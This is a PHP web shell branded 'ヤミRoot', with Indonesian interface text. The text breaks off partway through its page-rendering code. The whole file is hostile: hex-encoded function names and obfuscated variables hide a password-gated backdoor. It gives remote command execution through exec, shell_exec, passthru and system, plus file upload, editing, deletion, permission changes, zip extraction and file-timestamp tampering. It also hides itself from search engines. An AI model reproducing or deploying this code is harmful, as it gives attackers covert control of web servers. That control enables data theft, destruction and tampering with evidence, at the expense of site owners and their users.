<?php

$f = [ "6572726f725f7265706f7274696e67", "73657373696f6e5f7374617274", "696e695f736574", "686561646572", "6f625f656e645f636c65616e", "626173656e616d65", "66756e6374696f6e5f657869737473", "65786563", "696d706c6f6465", "7368656c6c5f65786563", "7061737374687275", "6f625f7374617274", "6f625f6765745f636c65616e", "73797374656d", "66696c657065726d73", "737072696e7466", "66696c655f657869737473", "69735f646972", "756e6c696e6b", "7363616e646972", "726d646972", "737562737472", "687474705f6275696c645f7175657279", "7265616c70617468", "676574637764", "7374725f7265706c616365", "69735f7772697461626c65", "66696c655f7075745f636f6e74656E7473", "68746d6c7370656369616c6368617273", "636f7079", "636c6173735f657869737473", "64617465", "6469726e616d65", "7374726c656e", "63686d6f64", "6f6374646563", "72656e616d65", "6d6b646972", "75726c656e636f6465", "676574686f737462796e616d65", "7068705f756e616d65", "6578706c6f6465", "7472696d", "69735f66696c65", "726f756e64", "66696c6573697a65", "69735f7265616461626c65", "75736f7274", "73747263617365636d70", "70617468696e666f", "66696c655f6765745f636f6e74656e7473", "746f756368", "66696c656d74696d65" ];
foreach ($f as $k => $v) { $f[$k] = hex2bin($v); } unset($k, $v);

$f[0](0);
$f[1]();
@$f[2]("\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67", 0);
@$f[2]("\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73", 0);
$f[2]("\x6d\x65\x6d\x6f\x72\x79\x5f\x6c\x69\x6d\x69\x74", "\x32\x35\x36\x4d");
$f[3]("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x55\x54\x46\x2d\x38");
$f[4]();

// --- CONFIG ---
$title = "\xe3\x83\xa4\xe3\x83\x9f\x52\x6f\x6f\x74";
$author = "\x7a\x2d\x6f\x6e\x65";
$theme_bg = "\x62\x6c\x61\x63\x6b";
$theme_fg = "\x23\x46\x46\x44\x37\x30\x30"; // Gold
$theme_highlight = "\x23\x46\x46\x44\x37\x30\x30"; // Gold
$theme_link = "\x23\x46\x46\x44\x37\x30\x30"; // Gold
$theme_link_hover = "\x23\x46\x46\x46\x46\x46\x46"; // White
$theme_border_color = "\x23\x46\x46\x44\x37\x30\x30"; // Gold
$theme_table_header_bg = "\x23\x31\x39\x31\x39\x31\x39";
$theme_table_row_hover = "\x23\x33\x33\x33\x33\x33\x33";
$theme_input_bg = "\x62\x6c\x61\x63\x6b";
$theme_input_fg = "\x23\x46\x46\x44\x37\x30\x30"; // Gold
$font_family = "\x27\x4b\x65\x6c\x6c\x79\x20\x53\x6c\x61\x62\x27\x2c\x20\x63\x75\x72\x73\x69\x76\x65";
$message_success_color = "\x23\x33\x33\x33\x33\x33\x33";
$message_error_color = "\x72\x65\x64";

// --- AUTHENTICATION ---
${"\x50\x41\x53\x53\x57\x4f\x52\x44\x5f\x4d\x44\x35"} = "\x61\x38\x34\x65\x35\x66\x32\x35\x65\x37\x66\x36\x64\x35\x64\x65\x39\x62\x38\x32\x63\x65\x33\x66\x36\x34\x64\x31\x62\x38\x66\x61";
if(isset(${"\x5f\x50\x4f\x53\x54"}["\x6c\x6f\x67\x69\x6e"])){
    ${"\x70\x61\x73\x73"} = ${"\x5f\x50\x4f\x53\x54"}["\x70\x61\x73\x73\x77\x6f\x72\x64"];
    if(md5(${"\x70\x61\x73\x73"}) === ${"\x50\x41\x53\x53\x57\x4f\x52\x44\x5f\x4d\x44\x35"}){
        ${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"] = true;
        header("Location: ".${"\x5f\x53\x45\x52\x56\x45\x52"}["\x50\x48\x50\x5f\x53\x45\x4c\x46"]);
        exit;
    } else {
        ${"\x6d\x73\x67"} = "\x50\x61\x73\x73\x77\x6f\x72\x64\x20\x73\x61\x6c\x61\x68\x21";
    }
}
if(isset(${"\x5f\x47\x45\x54"}["\x6c\x6f\x67\x6f\x75\x74"])){
    session_destroy();
    header("Location: ".${"\x5f\x53\x45\x52\x56\x45\x52"}["\x50\x48\x50\x5f\x53\x45\x4c\x46"]);
    exit;
}
if(!isset(${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"]) || ${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"] !== true){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?=$title?> - Login</title>
        <meta name="robots" content="noindex,nofollow">
        <style>
            body{background:#0d0d0d;color:#FFD700;font-family:monospace;text-align:center;padding-top:100px;}
            h1{color:#FFD700;}
            input{padding:6px;margin:5px;border-radius:4px;border:1px solid #FFD700;background:#000;color:#FFD700;}
            input[type=password]{width:200px;}
            input[type=submit]{background:#FFD700;color:#000;cursor:pointer;font-weight:bold;border:2px solid #FFD700;}
            input[type=submit]:hover{background:#00ff00;color:#000;border-color:#00ff00;}
            .msg{color:#e74c3c;margin-top:10px;}
            .login-row{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:10px;}
            .login-row label{font-size:14px;color:#FFD700;}
        </style>
    </head>
    <body>
        <h1><?=$title?></h1>
        <form method="POST">
            <div class="login-row">
                <label>Password:</label>
                <input type="password" name="password">
                <input type="submit" name="login" value="Login">
            </div>
        </form>
        <?php if(isset(${"\x6d\x73\x67"})) echo "<div class='msg'>".${"\x6d\x73\x67"}."</div>"; ?>
    </body>
    </html>
    <?php
    exit;
}
// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    global $f;
    return $f[5]($filename);
}

function exe($yu, $cwd = null) {
    global $f;
    if ($cwd) {
        $yu = "\x63\x64\x20" . escapeshellarg($cwd) . "\x20\x26\x26\x20" . $yu;
    }
    if ($f[6]("\x65\x78\x65\x63")) {
        $f[7]($yu . "\x20\x32\x3e\x26\x31", $output);
        return $f[8]("\x0a", $output);
    } elseif ($f[6]("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
        return $f[9]($yu);
    } elseif ($f[6]("\x70\x61\x73\x73\x74\x68\x72\x75")) {
        $f[11](); $f[10]($yu); return $f[12]();
    } elseif ($f[6]("\x73\x79\x73\x74\x65\x6d")) {
        $f[11](); $f[13]($yu); return $f[12]();
    }
    return "\x43\x6f\x6d\x6d\x61\x6e\x64\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x20\x64\x69\x73\x61\x62\x6c\x65\x64\x2e";
}

function getNumericPerms($file){
    global $f;
    $perms = @$f[14]($file);
    if ($perms === false) return "\x3f\x3f\x3f\x3f";
    return $f[21]($f[15]("\x25\x6f", $perms), -4);
}

function getOwner($file){
    global $f;
    // Cek apakah fungsi posix_getpwuid tersedia
    if (function_exists("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64")) { // posix_getpwuid
        $uid = @fileowner($file);
        if ($uid !== false) {
            $info = @posix_getpwuid($uid);
            return $info ? $info["\x6e\x61\x6d\x65"] : (string)$uid; // name
        }
    }
    // Fallback: gunakan exec langsung tanpa fungsi exe()
    if ($f[6]("\x65\x78\x65\x63")) { // function_exists("exec")
        $output = [];
        @exec("\x6c\x73\x20\x2d\x6c\x64\x20" . escapeshellarg($file) . "\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x7c\x20\x61\x77\x6b\x20\x27\x7b\x70\x72\x69\x6e\x74\x20\x24\x33\x7d\x27", $output); // ls -ld file 2>/dev/null | awk '{print $3}'
        $owner = trim(implode("\n", $output));
        return $owner ?: "\x3f\x3f\x3f"; // ???
    }
    if ($f[6]("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { // function_exists("shell_exec")
        $owner = @shell_exec("\x6c\x73\x20\x2d\x6c\x64\x20" . escapeshellarg($file) . "\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x7c\x20\x61\x77\x6b\x20\x27\x7b\x70\x72\x69\x6e\x74\x20\x24\x33\x7d\x27"); // ls -ld file 2>/dev/null | awk '{print $3}'
        $owner = trim($owner);
        return $owner ?: "\x3f\x3f\x3f"; // ???
    }
    return "\x3f\x3f\x3f"; // ???
}

function delete_recursive($target) {
    global $f;
    if (!$f[16]($target)) return true;
    if (!$f[17]($target)) return $f[18]($target);
    foreach ($f[19]($target) as $item) {
        if ($item == "\x2e" || $item == "\x2e\x2e") continue;
        if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return $f[20]($target);
}
function zip_add_folder($zip, $folder, $base_path_length) {
    global $f;
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY);
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $file_path = $file->getRealPath();
            $relative_path = $f[21]($file_path, $base_path_length);
            $zip->addFile($file_path, $relative_path);
        }
    }
}
function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path, $f;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    $params = ["\x70\x61\x74\x68" => $redirect_path];
    if ($msg_type) $params["\x6d\x73\x67\x5f\x74\x79\x70\x65"] = $msg_type;
    if ($msg_text) $params["\x6d\x73\x67\x5f\x74\x65\x78\x74"] = $msg_text;
    $f[3]("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f" . $f[22]($params));
    exit();
}
function formatSizeDisplay($bytes){
    global $f;
    if($bytes >= 1073741824) return $f[44]($bytes/1073741824, 2)."\x20\x47\x42";
    elseif($bytes >= 1048576) return $f[44]($bytes/1048576, 2)."\x20\x4d\x42";
    elseif($bytes >= 1024) return $f[44]($bytes/1024, 2)."\x20\x4b\x42";
    else return $bytes."\x20\x42";
}
// --- INITIAL SETUP & PATH ---
// $path = $f[23](isset($_GET["\x70\x61\x74\x68"]) ? $_GET["\x70\x61\x74\x68"] : $f[24]());
// $path = $f[25]("\x5c","\x2f",$path);
// Dapatkan base directory
$base_dir = $f[24](); // getcwd
$base_dir = $f[25]("\x5c","\x2f",$base_dir); // str_replace
$base_dir = rtrim($base_dir, "\x2f"); // rtrim /

// Dapatkan requested path
if (isset($_GET["\x70\x61\x74\x68"])) {
    $requested_path = $_GET["\x70\x61\x74\x68"];
    $requested_path = $f[25]("\x5c","\x2f",$requested_path);
    
    // Jika path relatif, gabungkan dengan base_dir
    if (strpos($requested_path, "\x2f") !== 0) { // tidak dimulai dengan /
        $path = $base_dir . "\x2f" . $requested_path;
    } else {
        $path = $requested_path;
    }
} else {
    $path = $base_dir;
}

// Hilangkan double slash
while (strpos($path, "\x2f\x2f") !== false) {
    $path = $f[25]("\x2f\x2f", "\x2f", $path); // str_replace //
}
// Hilangkan trailing slash kecuali root
if ($path !== "\x2f") {
    $path = rtrim($path, "\x2f");
}
// --- HANDLERS ---
if(isset($_FILES["\x66\x69\x6c\x65\x5f\x75\x70\x6c\x6f\x61\x64"])){
    $file_name = sanitizeFilename($_FILES["\x66\x69\x6c\x65\x5f\x75\x70\x6c\x6f\x61\x64"]["\x6e\x61\x6d\x65"]);
    if($f[29]($_FILES["\x66\x69\x6c\x65\x5f\x75\x70\x6c\x6f\x61\x64"]["\x74\x6d\x70\x5f\x6e\x61\x6d\x65"], $path."\x2f".$file_name)) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x55\x50\x4c\x4f\x41\x44\x20\x53\x55\x43\x43\x45\x53\x53\x3a\x20" . $file_name, $path);
    else redirect_with_message("\x65\x72\x72\x6f\x72", "\x46\x69\x6c\x65\x20\x47\x61\x67\x61\x6c\x20\x44\x69\x75\x70\x6c\x6f\x61\x64\x20\x21\x21", $path);
}

if (isset($_POST["\x62\x75\x6c\x6b\x5f\x61\x63\x74\x69\x6f\x6e"]) && isset($_POST["\x73\x65\x6c\x65\x63\x74\x65\x64\x5f\x66\x69\x6c\x65\x73"])) {
    $action = $_POST["\x62\x75\x6c\x6b\x5f\x61\x63\x74\x69\x6f\x6e"];
    $selected_files = $_POST["\x73\x65\x6c\x65\x63\x74\x65\x64\x5f\x66\x69\x6c\x65\x73"];
    if ($action === "\x7a\x69\x70\x5f\x73\x65\x6c\x65\x63\x74\x65\x64" && $f[30]("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65")) {
        $zip_filename = "\x61\x72\x63\x68\x69\x76\x65\x5f" . $f[31]("\x59\x2d\x6d\x2d\x64\x5f\x48\x2d\x69\x2d\x73") . "\x2e\x7a\x69\x70";
        $zip_filepath = $path . DIRECTORY_SEPARATOR . $zip_filename;
        $zip = new ZipArchive();
        if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($selected_files as $file) {
                $file_path = $f[23]($file);
                if ($f[43]($file_path)) $zip->addFile($file_path, $f[5]($file_path));
                elseif ($f[17]($file_path)) zip_add_folder($zip, $file_path, $f[33]($f[32]($file_path) . DIRECTORY_SEPARATOR));
            }
            $zip->close();
            redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x46\x69\x6c\x65\x20\x62\x65\x72\x68\x61\x73\x69\x6c\x20\x64\x69\x2d\x7a\x69\x70\x20\x6b\x65\x3a\x20" . $zip_filename, $path);
        } else {
            redirect_with_message("\x65\x72\x72\x6f\x72", "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6d\x62\x75\x61\x74\x20\x66\x69\x6c\x65\x20\x7a\x69\x70\x21", $path);
        }
    }
    elseif ($action === "\x64\x65\x6c\x65\x74\x65\x5f\x73\x65\x6c\x65\x63\x74\x65\x64") {
        foreach ($selected_files as $file_to_delete) {
            delete_recursive($file_to_delete);
        }
        redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x49\x74\x65\x6d\x20\x79\x61\x6e\x67\x20\x64\x69\x70\x69\x6c\x69\x68\x20\x62\x65\x72\x68\x61\x73\x69\x6c\x20\x64\x69\x68\x61\x70\x75\x73\x2e", $path);
    }
}

if(isset($_GET["\x6f\x70\x74\x69\x6f\x6e"]) && isset($_POST["\x6f\x70\x74\x5f\x61\x63\x74\x69\x6f\x6e"])){
    $target_full_path = $_POST["\x70\x61\x74\x68\x5f\x74\x61\x72\x67\x65\x74"];
    $action = $_POST["\x6f\x70\x74\x5f\x61\x63\x74\x69\x6f\x6e"];
    $current_dir = $f[23](isset($_GET["\x70\x61\x74\x68"]) ? $_GET["\x70\x61\x74\x68"] : $f[24]());
    switch ($action) {
        case "\x64\x65\x6c\x65\x74\x65":
            if (delete_recursive($target_full_path)) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x44\x45\x4c\x45\x54\x45\x20\x53\x55\x43\x43\x45\x53\x53\x20\x21\x21", $current_dir);
            else redirect_with_message("\x65\x72\x72\x6f\x72", "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6e\x67\x68\x61\x70\x75\x73\x21\x20\x50\x65\x72\x69\x6b\x73\x61\x20\x69\x7a\x69\x6e\x2e", $current_dir);
            break;
        case "\x63\x68\x6d\x6f\x64\x5f\x73\x61\x76\x65":
            if($f[34]($target_full_path, $f[35]($_POST["\x70\x65\x72\x6d\x5f\x76\x61\x6c\x75\x65"]))) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x43\x48\x4d\x4f\x44\x20\x53\x55\x43\x43\x45\x53\x53\x20\x21\x21", $current_dir);
            else redirect_with_message("\x65\x72\x72\x6f\x72", "\x43\x48\x4d\x4f\x44\x20\x47\x61\x67\x61\x6c\x20\x21\x21", $current_dir);
            break;
        case "\x72\x65\x6e\x61\x6d\x65\x5f\x73\x61\x76\x65":
            $new_full_path = $f[32]($target_full_path)."\x2f".sanitizeFilename($_POST["\x6e\x65\x77\x5f\x6e\x61\x6d\x65\x5f\x76\x61\x6c\x75\x65"]);
            if($f[36]($target_full_path, $new_full_path)) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x52\x45\x4e\x41\x4d\x45\x20\x53\x55\x43\x43\x45\x53\x53\x20\x21\x21", $current_dir);
            else redirect_with_message("\x65\x72\x72\x6f\x72", "\x52\x45\x4e\x41\x4d\x45\x20\x47\x61\x67\x61\x6c\x20\x21\x21", $current_dir);
            break;
        case "\x65\x64\x69\x74\x5f\x73\x61\x76\x65":
            if($f[26]($target_full_path)) {
                if($f[27]($target_full_path, $_POST["\x73\x72\x63\x5f\x63\x6f\x6e\x74\x65\x6e\x74"])) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x45\x44\x49\x54\x20\x53\x55\x43\x43\x45\x53\x53\x20\x21\x21", $current_dir);
                else redirect_with_message("\x65\x72\x72\x6f\x72", "\x45\x64\x69\x74\x20\x46\x69\x6c\x65\x20\x47\x61\x67\x61\x6c\x20\x21\x21", $current_dir);
            } else { redirect_with_message("\x65\x72\x72\x6f\x72", "\x46\x69\x6c\x65\x20\x74\x69\x64\x61\x6b\x20\x77\x72\x69\x74\x61\x62\x6c\x65\x21", $current_dir); }
            break;
        case "\x65\x78\x74\x72\x61\x63\x74\x5f\x73\x61\x76\x65":
            if ($f[30]("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65")) {
                $zip = new ZipArchive;
                if ($zip->open($target_full_path) === TRUE) {
                    $zip->extractTo($current_dir);
                    $zip->close();
                    redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x46\x69\x6c\x65\x20\x62\x65\x72\x68\x61\x73\x69\x6c\x20\x64\x69\x65\x6b\x73\x74\x72\x61\x6b\x21", $current_dir);
                } else { redirect_with_message("\x65\x72\x72\x6f\x72", "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6d\x62\x75\x6b\x61\x20\x66\x69\x6c\x65\x20\x7a\x69\x70\x21", $current_dir); }
            } else { redirect_with_message("\x65\x72\x72\x6f\x72", "\x43\x6c\x61\x73\x73\x20\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65\x20\x74\x69\x64\x61\x6b\x20\x64\x69\x74\x65\x6d\x75\x6b\x61\x6e\x21", $current_dir); }
            break;
        case "\x63\x68\x64\x61\x74\x65\x5f\x73\x61\x76\x65":
            $new_timestamp = strtotime($_POST["\x6e\x65\x77\x5f\x64\x61\x74\x65\x5f\x76\x61\x6c\x75\x65"]);
            if($new_timestamp && $f[51]($target_full_path, $new_timestamp)) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x43\x48\x44\x41\x54\x45\x20\x53\x55\x43\x43\x45\x53\x53\x20\x21\x21", $current_dir);
            else redirect_with_message("\x65\x72\x72\x6f\x72", "\x43\x48\x44\x41\x54\x45\x20\x47\x61\x67\x61\x6c\x20\x21\x21", $current_dir);
            break;
    }
}

if(isset($_GET["\x63\x72\x65\x61\x74\x65\x5f\x6e\x65\x77"])) {
    $target_path_new = $path . "\x2f" . sanitizeFilename($_POST["\x63\x72\x65\x61\x74\x65\x5f\x6e\x61\x6d\x65"]);
    if ($_POST["\x63\x72\x65\x61\x74\x65\x5f\x74\x79\x70\x65"] == "\x66\x69\x6c\x65") {
        if (@$f[27]($target_path_new, '') !== false) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x46\x69\x6c\x65\x20\x42\x61\x72\x75\x20\x42\x65\x72\x68\x61\x73\x69\x6c\x20\x44\x69\x62\x75\x61\x74", $path);
        else redirect_with_message("\x65\x72\x72\x6f\x72", "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6d\x62\x75\x61\x74\x20\x66\x69\x6c\x65\x20\x62\x61\x72\x75\x21", $path);
    } elseif ($_POST["\x63\x72\x65\x61\x74\x65\x5f\x74\x79\x70\x65"] == "\x64\x69\x72") {
        if (@$f[37]($target_path_new)) redirect_with_message("\x73\x75\x63\x63\x65\x73\x73", "\x46\x6f\x6c\x64\x65\x72\x20\x42\x61\x72\x75\x20\x42\x65\x72\x68\x61\x73\x69\x6c\x20\x44\x69\x62\x75\x61\x74", $path);
        else redirect_with_message("\x65\x72\x72\x6f\x72", "\x47\x61\x67\x61\x6c\x20\x6d\x65\x6d\x62\x75\x61\x74\x20\x66\x6f\x6c\x64\x65\x72\x20\x62\x61\x72\x75\x21", $path);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<title><?=$f[28]($title)?></title>
<meta name="robots" content="noindex,nofollow">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Kelly Slab',cursive;background-color:<?=$theme_bg?>;color:<?=$theme_fg?>;font-size:14px;}
a{font-size:1em;color:<?=$theme_link?>;text-decoration:none;}
a:hover{color:<?=$theme_link_hover?>;}
table{border-collapse:collapse;width:95%;max-width:1400px;margin:15px auto;}
.table_home,.td_home{border:2px solid #333;padding:7px;vertical-align:middle;}
#content tr:hover{background-color:<?=$theme_table_row_hover?>;}
#content .first{background-color:<?=$theme_table_header_bg?>;font-weight:bold;color:#FFD700;}
input,select,textarea{border:1px solid #FFD700;border-radius:5px;background:<?=$theme_input_bg?>;color:#fff;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;}

input[type="submit"]{background:#FFD700;color:#000;border:2px solid #FFD700;cursor:pointer;font-weight:bold;}
input[type="submit"]:hover{background:#00ff00;color:#000;border-color:#00ff00;}

/* ===== HEADER ===== */
.header{text-align:center;padding:18px 0;background:#0a0a0a;border-bottom:2px solid #FFD700;margin-bottom:0;}
.header h1{font-family:'Kelly Slab';font-size:28px;color:#FFD700;margin:0;letter-spacing:2px;}
.header h1 i{color:#FFD700;margin-right:8px;}

/* ===== SERVER INFO - VERTICAL ===== */
.server-info{padding:12px 25px;background:#111;border-bottom:1px solid #333;margin:0;font-size:13px;line-height:1.8}
.server-info .info-item{margin-bottom:6px}
.server-info .info-item i{color:#FFD700;font-size:14px;width:16px;margin-right:6px}
.server-info .info-item .label{display:inline-block;width:110px;color:#FFD700;vertical-align:top}
.server-info .info-item .value{display:inline-block;width:calc(100% - 140px);color:#fff;word-break:break-word}

/* ===== NAVIGATION BAR - CENTERED ===== */
.nav-bar{display:flex;justify-content:center;align-items:center;gap:0;padding:10px 25px;background:#0d0d0d;border-bottom:1px solid #333;}
.nav-bar a{padding:6px 18px;font-size:13px;color:#FFD700;background:#1a1a1a;border:1px solid #FFD700;transition:all 0.2s;text-transform:uppercase;letter-spacing:0.5px;}
.nav-bar a:first-child{border-radius:4px 0 0 4px;}
.nav-bar a:last-child{border-radius:0 4px 4px 0;}
.nav-bar a:hover,.nav-bar a.active{background:#FFD700;color:#000;border-color:#FFD700;text-decoration:none;}
.nav-bar a+a{border-left:none;}

/* ===== BREADCRUMB ===== */
.breadcrumb{padding:8px 25px;background:#0d0d0d;border-bottom:1px solid #333;font-size:13px;overflow-x:auto;white-space:nowrap;}
.breadcrumb i{color:#FFD700;font-size:13px;margin-right:4px;}
.breadcrumb a{color:#FFD700;font-size:13px;}
.breadcrumb a:hover{background:#1a1a1a;color:<?=$theme_link_hover?>;text-decoration:none}

.message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1400px;font-weight:bold;text-align:center;}
.message.success{background:#111;color:#00ff00;border:1px solid #00ff00;text-shadow:0 0 5px #00ff00;}
.message.error{background:#111;color:#ff0000;border:1px solid #ff0000;text-shadow:0 0 5px #ff0000;}
.section-box{background-color:#1a1a1a;border:1px solid #FFD700;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1400px;}
.section-box h3{color:#FFD700;margin-bottom:10px;}
pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#FFD700;}
</style>
</head>
<body>
<div class="header">
    <a href="?"><h1><i class="fa fa-skull"></i><?=$f[28]($title)?></h1></a>
</div>
<div class="server-info">
    <div class="info-item">
        <i class="fa fa-user"></i>
        <span class="label">User / IP:</span>
        <span class="value"><?=$_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]?></span>
    </div>
    <div class="info-item">
        <i class="fa fa-server"></i>
        <span class="label">Host / Server:</span>
        <span class="value"><?=$f[39]($_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"])."\x20\x2f\x20".$_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"]?></span>
    </div>
    <div class="info-item">
        <i class="fa fa-hdd-o"></i>
        <span class="label">System:</span>
        <span class="value"><?=$f[40]()?></span>
    </div>
   <div class="info-item">
        <i class="fa fa-ban"></i>
        <span class="label">Disable Functions:</span>
        <span class="value"><?=($df=ini_get('disable_functions'))?$f[28]($df):'None'?></span>
    </div>
</div>
<div class="nav-bar">
    <a href="?path=<?=$f[38]($path)?>&action=cmd"><i class="fa fa-terminal"></i> Command</a>
    <a href="?path=<?=$f[38]($path)?>&action=upload_form"><i class="fa fa-upload"></i> Upload</a>
    <a href="?path=<?=$f[38]($path)?>&action=create_form"><i class="fa fa-plus"></i> Create</a>
    <a href="?logout=1" style="color:#e74c3c;">Logout</a>
</div>
<div class="breadcrumb">
    <span style="color:#FFF;">Path :</span>
    <i class="fa fa-folder"></i>
    <a href="?path=/">/</a><?php
    $paths_array = $f[41]("\x2f", $f[42]($path, "\x2f"));
    $current_built_path = '';
    foreach($paths_array as $pat){
        if(empty($pat)) continue;
        $current_built_path .= "\x2f" . $pat;
        echo '<a href="?path='.$f[38]($current_built_path).'">'.$f[28]($pat).'</a>/';
    }
    ?>
</div>

<?php
if(isset($_GET["\x6d\x73\x67\x5f\x74\x65\x78\x74"])) { echo "<div class='message ".$f[28]($_GET["\x6d\x73\x67\x5f\x74\x79\x70\x65"])."'>".$f[28]($_GET["\x6d\x73\x67\x5f\x74\x65\x78\x74"])."</div>"; }
if(isset($_SESSION["\x66\x65\x61\x74\x75\x72\x65\x5f\x6f\x75\x74\x70\x75\x74"])) { echo '<div class="section-box"><h4>Hasil Fitur Sebelumnya:</h4><pre>'.$_SESSION["\x66\x65\x61\x74\x75\x72\x65\x5f\x6f\x75\x74\x70\x75\x74"].'</pre></div>'; unset($_SESSION["\x66\x65\x61\x74\x75\x72\x65\x5f\x6f\x75\x74\x70\x75\x74"]); }

$show_file_list = true;
if (isset($_GET["\x61\x63\x74\x69\x6f\x6e"])) {
    $show_file_list = false;
    echo '<div class="section-box">';
    switch ($_GET["\x61\x63\x74\x69\x6f\x6e"]) {
        case "\x63\x6d\x64":
           $cmd_output = (isset($_POST["\x64\x6f\x5f\x63\x6d\x64"])) ? $f[28](exe($_POST["\x79\x75\x5f\x69\x6e\x70\x75\x74"], $path)) : '';
            echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.$f[38]($path).'"><input type="text" name="yu_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>';
            if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>';
            break;
        case "\x75\x70\x6c\x6f\x61\x64\x5f\x66\x6f\x72\x6d":
            echo '<h3>Upload File</h3><form enctype="multipart/form-data" method="POST" action="?path='.$f[38]($path).'"><input type="file" name="file_upload" required/><input type="submit" value="UPLOAD" style="margin-left:10px;"/></form>';
            break;
        case "\x63\x72\x65\x61\x74\x65\x5f\x66\x6f\x72\x6d":
            echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.$f[38]($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name" required placeholder="Nama file/folder"> <input type="submit" value="Create"></form>';
            break;
        case "\x64\x65\x6c\x65\x74\x65":
            echo '<h3>Konfirmasi Hapus: '.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</h3><p style="color:red;text-align:center;">Anda YAKIN? Tindakan ini tidak bisa dibatalkan.</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case "\x65\x78\x74\x72\x61\x63\x74\x5f\x66\x6f\x72\x6d":
            echo '<h3>Konfirmasi Ekstrak: '.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</h3><p>Ekstrak semua isi file ini ke direktori saat ini ('.$f[28]($path).')?</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"]).'"><input type="hidden" name="opt_action" value="extract_save"><input type="submit" value="YA, EKSTRAK"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case "\x76\x69\x65\x77\x5f\x66\x69\x6c\x65":
            echo '<h3>Viewing: '.$f[28]($f[5]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</h3><textarea style="width:100%;height:400px;" readonly>'.$f[28](@$f[50]($_GET["\x74\x61\x72\x67\x65\x74\x5f\x66\x69\x6c\x65"])).'</textarea>';
            break;
        case "\x65\x64\x69\x74\x5f\x66\x6f\x72\x6d":
